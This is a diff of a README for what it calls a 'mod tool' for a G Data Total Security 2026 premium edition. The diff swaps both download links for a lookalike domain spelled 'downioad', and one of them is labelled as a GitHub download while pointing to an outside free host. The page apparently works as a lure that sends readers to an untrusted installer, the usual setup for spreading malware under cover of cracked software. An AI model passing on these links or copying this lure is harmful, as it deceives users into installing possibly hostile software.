@@ -2,7 +2,7 @@
 
 Welcome to the repository for the G Data Total Security 2026 Premium Edition tool, a powerful utility designed to enhance your Windows desktop security experience. This mod tool offers advanced features for managing and optimizing your protection suite, ensuring a safe and efficient computing environment in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Overview
 
@@ -61,7 +61,7 @@ You can uninstall the tool through the Windows Control Panel under "Programs and
 
 For the latest version of the G Data Total Security 2026 Premium Edition tool, including updates and patches, visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
